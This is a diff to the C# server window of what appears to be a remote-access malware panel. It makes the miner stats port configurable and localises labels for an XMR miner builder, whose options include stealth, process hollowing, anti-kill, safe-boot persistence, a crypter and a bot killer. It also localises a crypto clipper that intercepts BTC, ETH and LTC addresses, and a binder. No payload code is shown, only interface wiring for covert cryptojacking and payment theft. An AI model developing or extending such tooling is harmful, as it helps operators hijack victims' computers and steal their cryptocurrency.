@@ -27,7 +27,7 @@ public partial class ServerWindow : ThemedWindow
     private readonly DispatcherTimer _uptimeTimer;
     private readonly System.Collections.ObjectModel.ObservableCollection<Data.AutoTaskEntry> _autoTasks = new();
     private Net.SeroDiscordRPC? _discordRpc;
-    private const int MinerStatsPort = 8081;
+    private int MinerStatsPort => int.TryParse(TxtMnrStatsPort?.Text, out int p) && p > 0 ? p : 8081;
     // BulkObservableCollection: fires one Reset instead of N individual change events.
     // Prevents DataGrid from refreshing N×N times when thousands of clients connect.
     private sealed class BulkObservableCollection<T> : System.Collections.ObjectModel.ObservableCollection<T>
@@ -999,8 +999,9 @@ public partial class ServerWindow : ThemedWindow
 
                 // Start integrated miner stats endpoint
                 var mnrToken = EnsureMinerToken();
-                _minerStatsHost = new Net.MinerStatsHost(MinerStatsPort, mnrToken);
-                try { _minerStatsHost.Start(); Log($"[+] Miner stats listening on port {MinerStatsPort}."); }
+                var mnrPort = MinerStatsPort;
+                _minerStatsHost = new Net.MinerStatsHost(mnrPort, mnrToken);
+                try { _minerStatsHost.Start(); Log($"[+] Miner stats listening on port {mnrPort}."); }
                 catch (Exception mex) { Log($"[!] Miner stats host failed: {mex.Message}"); }
 
                 NotificationService.PlayStartup();
@@ -1437,7 +1438,7 @@ public partial class ServerWindow : ThemedWindow
         string msg = clients.Count == 1
             ? $"Disconnect '{clients[0].Username}@{clients[0].IP}'?"
             : $"Disconnect {clients.Count} clients?";
-        if (MessageBox.Show(msg, "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
+        if (MessageBox.Show(msg, Lang.Get("MSG_CONFIRM"), MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
         foreach (var client in clients)
         {
             try { await _server.SendToClient(client.Id, new Packet { Type = PacketType.Disconnect }); } catch { }
@@ -2740,6 +2741,7 @@ public partial class ServerWindow : ThemedWindow
             if (cfg.TryGetValue("WnTelegramChatId2", out var wc2)) WnTelegramChatId2.Text = wc2;
             SetWinNotifyKeywordsLocked(WinNotifyEnabled.IsChecked == true);
             if (cfg.TryGetValue("MnrStatsToken", out var mst) && !string.IsNullOrEmpty(mst)) _mnrStatsToken = mst;
+            if (cfg.TryGetValue("MnrStatsPort",  out var msp) && !string.IsNullOrEmpty(msp) && TxtMnrStatsPort != null) TxtMnrStatsPort.Text = msp;
 
             // Crypto Clipper
             if (cfg.TryGetValue("ClipperBTC",  out var cBtc))  ClipperBTC.Text  = cBtc;
@@ -2807,6 +2809,7 @@ public partial class ServerWindow : ThemedWindow
                 ["WnTelegramChatId1"] = WnTelegramChatId1.Text.Trim(),
                 ["WnTelegramChatId2"] = WnTelegramChatId2.Text.Trim(),
                 ["MnrStatsToken"] = EnsureMinerToken(),
+                ["MnrStatsPort"]  = TxtMnrStatsPort?.Text.Trim() ?? "8081",
                 ["ClipperBTC"]  = ClipperBTC.Text.Trim(),
                 ["ClipperETH"]  = ClipperETH.Text.Trim(),
                 ["ClipperLTC"]  = ClipperLTC.Text.Trim(),
@@ -4584,7 +4587,7 @@ Read-Host 'Press Enter to close'
         string msg = selected.Count == 1
             ? $"Remove auto-task '{selected[0].FileName}'?\nThis cannot be undone."
             : $"Remove {selected.Count} auto-tasks?\nThis cannot be undone.";
-        if (MessageBox.Show(msg, "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
+        if (MessageBox.Show(msg, Lang.Get("MSG_CONFIRM"), MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
         foreach (var task in selected)
         {
             _autoTasks.Remove(task);
@@ -8181,6 +8184,61 @@ Read-Host 'Press Enter to close'
         if (BldBlockCis    != null) BldBlockCis.ToolTip    = Lang.Get("BLD_TT_BLOCKCIS");
         if (BldAntiSandbox != null) BldAntiSandbox.ToolTip = Lang.Get("BLD_TT_ANTISANDBOX");
         if (BldAntiKill    != null) BldAntiKill.ToolTip    = Lang.Get("BLD_TT_ANTIKILL");
+
+        // ── XMR Miner section/field labels ──
+        if (MnrLblBinary       != null) MnrLblBinary.Text       = Lang.Get("MNR_SEC_BINARY");
+        if (MnrSecNetwork      != null) MnrSecNetwork.Text      = Lang.Get("MNR_SEC_NETWORK");
+        if (MnrLblPool         != null) MnrLblPool.Text         = Lang.Get("MNR_LBL_POOL");
+        if (MnrLblWallet       != null) MnrLblWallet.Text       = Lang.Get("MNR_LBL_WALLET");
+        if (MnrLblPass         != null) MnrLblPass.Text         = Lang.Get("MNR_LBL_PASS");
+        if (MnrLblAlgo         != null) MnrLblAlgo.Text         = Lang.Get("MNR_LBL_ALGO");
+        if (MnrLblWorker       != null) MnrLblWorker.Text       = Lang.Get("MNR_LBL_WORKER");
+        if (MnrSecCpu          != null) MnrSecCpu.Text          = Lang.Get("MNR_SEC_CPU");
+        if (MnrLblCpuIdle      != null) MnrLblCpuIdle.Text      = Lang.Get("MNR_LBL_CPU_IDLE");
+        if (MnrLblCpuActive    != null) MnrLblCpuActive.Text    = Lang.Get("MNR_LBL_CPU_ACTIVE");
+        if (MnrLblIdleSec      != null) MnrLblIdleSec.Text      = Lang.Get("MNR_LBL_IDLE_SEC");
+        if (MnrSecDeploy       != null) MnrSecDeploy.Text       = Lang.Get("MNR_SEC_DEPLOY");
+        if (MnrLblInstall      != null) MnrLblInstall.Text      = Lang.Get("MNR_LBL_INSTALL");
+        if (MnrSecProtection   != null) MnrSecProtection.Text   = Lang.Get("MNR_SEC_PROTECTION");
+        if (MnrLblHollowTarget != null) MnrLblHollowTarget.Text = Lang.Get("MNR_LBL_HOLLOW");
+        if (MnrSecBuild        != null) MnrSecBuild.Text        = Lang.Get("MNR_SEC_BUILD");
+        if (MnrLblStatsPort    != null) MnrLblStatsPort.Text   = Lang.Get("MNR_LBL_STATS_PORT");
+        if (BldMnrStatsInfo    != null) BldMnrStatsInfo.Text    = Lang.Get("MNR_STATS_INFO");
+
+        // ── XMR Miner checkboxes ──
+        if (BldMnrTls          != null) BldMnrTls.Content          = Lang.Get("MNR_CHK_TLS");
+        if (BldMnrStealth      != null) BldMnrStealth.Content      = Lang.Get("MNR_CHK_STEALTH");
+        if (BldMnrDisableSleep != null) BldMnrDisableSleep.Content = Lang.Get("MNR_CHK_SLEEP");
+        if (BldMnrStartup      != null) BldMnrStartup.Content      = Lang.Get("MNR_CHK_STARTUP");
+        if (BldMnrSafeBoot     != null) BldMnrSafeBoot.Content     = Lang.Get("MNR_CHK_SAFEBOOT");
+        if (BldMnrWatchdog     != null) BldMnrWatchdog.Content     = Lang.Get("MNR_CHK_WATCHDOG");
+        if (BldMnrBotKiller    != null) BldMnrBotKiller.Content    = Lang.Get("MNR_CHK_BOTKILLER");
+        if (BldMnrHollow       != null) BldMnrHollow.Content       = Lang.Get("MNR_CHK_HOLLOW");
+        if (BldMnrEncrypt      != null) BldMnrEncrypt.Content      = Lang.Get("MNR_CHK_CRYPTER");
+        if (BldMnrUpx          != null) BldMnrUpx.Content          = Lang.Get("MNR_CHK_UPX");
+
+        // ── XMR Miner buttons ──
+        if (BtnMnrBuild      != null) BtnMnrBuild.Content      = Lang.Get("MNR_BTN_BUILD");
+        if (BtnMnrSaveConfig != null) BtnMnrSaveConfig.Content = Lang.Get("MNR_BTN_SAVE_CFG");
+        if (BtnMnrLoadConfig != null) BtnMnrLoadConfig.Content = Lang.Get("MNR_BTN_LOAD_CFG");
+
+        // ── Screen buttons ──
+        if (BtnScreenStart != null) BtnScreenStart.Content = Lang.Get("ACT_START").ToUpper();
+        if (BtnScreenStop  != null) BtnScreenStop.Content  = Lang.Get("ACT_STOP").ToUpper();
+
+        // ── Clipper labels and buttons ──
+        if (LblClipperTitle        != null) LblClipperTitle.Text        = Lang.Get("CLR_TITLE");
+        if (LblClipperSubtitle     != null) LblClipperSubtitle.Text     = Lang.Get("CLR_SUBTITLE");
+        if (LblClipperIntercepting != null) LblClipperIntercepting.Text = Lang.Get("CLR_INTERCEPTING");
+        if (BtnClipperStart        != null) BtnClipperStart.Content     = Lang.Get("ACT_START").ToUpper();
+        if (BtnClipperStop         != null) BtnClipperStop.Content      = Lang.Get("ACT_STOP").ToUpper();
+        if (BtnClipperSave         != null) BtnClipperSave.Content      = "💾 " + Lang.Get("ACT_SAVE");
+        if (LblClipperIntLog       != null) LblClipperIntLog.Text       = Lang.Get("BND_INTERCEPT");
+        if (BtnClipperClear        != null) BtnClipperClear.Content     = Lang.Get("ACT_CLEAR");
+        if (LblClipperDestAddr     != null) LblClipperDestAddr.Text     = Lang.Get("BND_DEST_ADDR");
+
+        // ── Binder build button ──
+        if (BtnBinderBuildTxt != null) BtnBinderBuildTxt.Text = Lang.Get("ACT_BUILD");
     }
 
     // Maps DataGridTextColumn instance → original English header so we can always re-match
